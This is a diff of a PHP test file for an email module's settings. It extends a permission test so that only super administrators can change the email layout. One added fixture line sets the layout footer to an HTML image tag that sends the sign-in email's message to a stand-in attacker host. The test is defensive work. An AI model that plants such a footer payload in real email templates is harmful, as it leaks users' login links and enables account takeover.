@@ -927,7 +927,7 @@ test('setConfig keeps the ClientFence settings a module page saves with their ow
     ],
 ]);
 
-test('setConfig reserves mail transport changes for super administrators', function (bool $isSuperAdministrator, array $stored, array $sentTransport, array $expectedTransport): void {
+test('setConfig reserves mail transport and email layout changes for super administrators', function (bool $isSuperAdministrator, array $stored, array $sentTransport, array $expectedTransport): void {
     $service = Mockery::mock(Service::class)->makePartial();
     $service->shouldReceive('hasManagePermission')->once()->with('mod_email')->andReturnNull();
     $service->shouldReceive('getConfig')->once()->with('mod_email')->andReturn($stored);
@@ -967,6 +967,8 @@ test('setConfig reserves mail transport changes for super administrators', funct
         'smtp_username' => 'saved-user',
         'smtp_password' => 'saved-password',
         'sendgrid_key' => 'saved-key',
+        // The email layout wraps the sign-in link emails (Email\Layout, CF-234).
+        'layout_footer' => '<p>Saved footer</p>',
     ];
     $sentTransport = [
         'mailer' => 'custom',
@@ -976,6 +978,7 @@ test('setConfig reserves mail transport changes for super administrators', funct
         'smtp_username' => 'changed-user',
         'smtp_password' => 'changed-password',
         'sendgrid_key' => 'changed-key',
+        'layout_footer' => '<img src="https://attacker.test/{{ email_message|e(\'url\') }}">',
     ];
 
     yield 'staff cannot replace stored transport settings' => [false, $storedTransport, $sentTransport, $storedTransport];
